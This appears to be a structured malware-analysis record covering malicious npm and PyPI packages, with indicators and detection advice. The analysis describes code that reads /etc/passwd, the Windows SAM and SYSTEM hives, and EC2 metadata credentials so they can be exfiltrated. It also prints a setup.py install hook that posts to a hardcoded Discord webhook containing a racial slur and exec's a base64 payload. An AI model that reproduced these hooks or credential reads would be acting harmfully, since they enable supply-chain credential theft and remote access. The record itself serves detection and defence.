package_info.why_malicious: The package is explicitly designed to exfiltrate highly sensitive system files—including /etc/passwd on Unix systems, the Windows SAM and SYSTEM hives, and Amazon EC2 instance credentials—to attacker-controlled endpoints. This demonstrates a clear intent to steal credentials, compromise cloud and on-premises systems, and enable remote access, representing a severe supply chain threat.

execution_context.trigger: import-time or runtime (when index.js is loaded/executed)

malicious_snippets.code_behavior: At import-time or runtime, the code checks for the existence of /etc/passwd, reads its contents using fs.readFileSync, encodes the data in base64, and stores the encoded string in a variable for later exfiltration.

malice_analysis.why_suspicious: Reading /etc/passwd is unnecessary for typical npm package operation and is a common technique for credential theft or reconnaissance.
malice_analysis.violated_expectations: Legitimate npm packages should not access or process sensitive system files such as /etc/passwd, especially outside of explicit system administration contexts.
malice_analysis.similar_legitimate_use: System administration or auditing tools may read /etc/passwd for legitimate purposes, but general-purpose npm packages should not.
key_indicators: Base64 encodes contents of sensitive file
Stores encoded data for later use

execution_context.trigger: import-time or runtime (when index.js is loaded/executed)

malicious_snippets.code_behavior: At import-time or runtime, the code checks for the existence of the Windows SAM file, reads its contents using fs.readFileSync, encodes the data in base64, and stores the encoded string in a variable for later exfiltration.

malice_analysis.why_suspicious: Accessing the Windows SAM file is a direct attempt to obtain password hashes and is a hallmark of credential theft.
malice_analysis.violated_expectations: Normal npm packages should never access Windows credential stores such as the SAM file.
malice_analysis.similar_legitimate_use: Forensic or backup tools may access the SAM file, but this is never expected in general-purpose npm packages.

execution_context.trigger: import-time or runtime (when index.js is loaded/executed)

malicious_snippets.code_behavior: At import-time or runtime, the code checks for the existence of the Windows SYSTEM hive, reads its contents using fs.readFileSync, encodes the data in base64, and stores the encoded string in a variable for later exfiltration.

malice_analysis.why_suspicious: Accessing the SYSTEM hive is a known technique for extracting system secrets and is not required for normal package operation.
malice_analysis.violated_expectations: Legitimate npm packages should not access or process the SYSTEM hive, which contains sensitive system configuration and secrets.
malice_analysis.similar_legitimate_use: Forensic or system recovery tools may access the SYSTEM hive, but this is not expected in npm packages.

execution_context.trigger: import-time or runtime (when index.js is loaded/executed)

malicious_snippets.code_behavior: At import-time or runtime, the code prepares an HTTP GET request to the AWS EC2 instance metadata service at 169.254.169.254 to retrieve security credentials, enabling subsequent exfiltration of cloud access keys.

malice_analysis.why_suspicious: Accessing the EC2 metadata service is a well-known cloud credential theft technique and is not required for normal npm package operation.
malice_analysis.violated_expectations: Normal packages should not access cloud instance metadata endpoints, especially without user consent.
malice_analysis.similar_legitimate_use: Cloud management agents or monitoring tools may access metadata, but general-purpose npm packages should not.
key_indicators: Prepares HTTP request to retrieve cloud credentials

malicious_snippets.code_snippet:
import setuptools
try:
    import requests
    requests.post('https://discord.com/api/webhooks/9851628622475326/PHn1j-FhVhktY6c_pBiaolb1UQbNHS6e6Qwt5A6tCkymjO7j06dgu6y', json={'content':'niger'})
    exec("""import base64 as b; exec(b.b64decode('...'))""")
except:
    pass
malicious_snippets.code_behavior: At install-time, the code sends a notification to a hardcoded Discord webhook using an HTTP POST request, then executes an encrypted (base64-encoded) payload via exec, which exfiltrates data and opens a reverse shell to a remote IP, enabling remote attacker access.

malice_analysis.why_suspicious: setup.py should not contact external webhooks or execute encrypted payloads, as this is indicative of data exfiltration and remote code execution.
malice_analysis.violated_expectations: setup.py is expected to handle package installation logic only, not to exfiltrate data or open remote shells.
malice_analysis.similar_legitimate_use: There are no legitimate reasons for setup.py to contain encrypted payloads or send data to Discord webhooks.
key_indicators: Execution of base64-encoded payload via exec
Reverse shell behavior initiated from setup.py

attack_chain.action: Malicious package is installed or imported, triggering execution of index.js (npm) or setup.py (PyPI).
attack_chain.leads_to: Initial execution of malicious code, enabling access to sensitive files and environment.

attack_chain.action: Sensitive files (/etc/passwd, SAM, SYSTEM) and cloud credentials are read and encoded in base64.
attack_chain.leads_to: Preparation of sensitive data for exfiltration.

attack_chain.action: Encoded data and environment details are exfiltrated to attacker-controlled endpoints, such as Discord webhooks.
attack_chain.leads_to: Attacker receives credentials and system information.

attack_chain.action: A reverse shell is opened, allowing the attacker to execute arbitrary OS commands remotely.
attack_chain.leads_to: Full system compromise and persistent remote access.

behavioral_signatures: Access to /etc/passwd, Windows SAM, or SYSTEM files by npm or PyPI packages during install or import
Base64 encoding of sensitive file contents immediately after reading system credential files
Network requests to 169.254.169.254 (AWS EC2 metadata service) from package code
Outbound HTTP POST requests to Discord webhooks (discord.com/api/webhooks/...)
Execution of encrypted (base64) payloads via exec in setup.py
file_indicators: index.js containing code that accesses /etc/passwd, SAM, or SYSTEM files
Hardcoded Discord webhook URLs in package code
network_indicators: Outbound HTTP POST requests to discord.com/api/webhooks/*
Unexpected external network connections during package installation or import
detection_knowledge.how_to_detect: Monitor for package installation or import events where code accesses sensitive system files (e.g., /etc/passwd, Windows SAM/SYSTEM), encodes data in base64, or initiates outbound network requests to known exfiltration endpoints such as Discord webhooks or the AWS metadata service. Flag any setup.py or index.js files containing encrypted payloads (e.g., base64-encoded exec statements) or references to credential stores. Use network monitoring to detect unexpected connections to Discord, 169.254.169.254, or other suspicious domains during package installation or runtime. Automated detection systems should correlate file access, encoding, and network exfiltration behaviors to identify malicious packages.
